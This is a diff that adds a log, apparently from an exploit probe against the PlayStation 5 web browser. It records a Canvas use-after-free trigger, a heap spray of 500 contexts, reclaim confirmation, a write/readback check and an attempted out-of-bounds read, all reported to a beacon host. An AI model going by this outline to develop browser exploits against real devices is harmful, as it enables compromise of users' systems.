@@ -1,0 +1,17 @@
+[2026-11-05 19:07:39.351] BEACON 10.0.0.96: UA: Mozilla/5.0 (PlayStation; PlayStation 5/14.10) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15
+[2026-11-05 19:07:39.455] BEACON 10.0.0.96: [1] Triggering Canvas getContext() UAF...
+[2026-11-05 19:07:39.518] BEACON 10.0.0.96: [6] setLineDash/get round-trip: 100,200,300,100,200,300
+[2026-11-05 19:07:39.529] BEACON 10.0.0.96: [3] lineWidth=7777.77 raw=0x40be61c51eb851ec
+[2026-11-05 19:07:39.547] BEACON 10.0.0.96: [DONE] Canvas UAF probe complete
+[2026-11-05 19:07:39.563] BEACON 10.0.0.96: [5] ALIAS: spray #9 reads 9999.99 - this is the reclaimer
+[2026-11-05 19:07:39.579] BEACON 10.0.0.96: [3] *** RECLAIM CONFIRMED: lineWidth matches spray marker ***
+[2026-11-05 19:07:39.585] BEACON 10.0.0.96: [1] getter=true inner=OK bmr=OK
+[2026-11-05 19:07:39.601] BEACON 10.0.0.96: [6] measureText width=19
+[2026-11-05 19:07:39.621] BEACON 10.0.0.96: [2] Sprayed 500 contexts, marker=7777.77
+[2026-11-05 19:07:39.627] BEACON 10.0.0.96: [6] fillStyle: #000000
+[2026-11-05 19:07:39.654] BEACON 10.0.0.96: [4] WRITE: set 9999.99, read back 9999.99, match=true
+[2026-11-05 19:07:39.664] BEACON 10.0.0.96: [6] getLineDash: 0 entries
+[2026-11-05 19:07:39.673] BEACON 10.0.0.96: [7] After 1 restore: lineWidth=9999.99 raw=0x40c387feb851eb85
+[2026-11-05 19:07:39.694] BEACON 10.0.0.96: [6] transform: a=1,b=0,c=0,d=1,e=0,f=0
+[2026-11-05 19:07:39.702] BEACON 10.0.0.96: [2] Spraying 500 Canvas2D contexts (768B each)...
+[2026-11-05 19:07:39.709] BEACON 10.0.0.96: [7] Attempting OOB state read via save/restore mismatch...
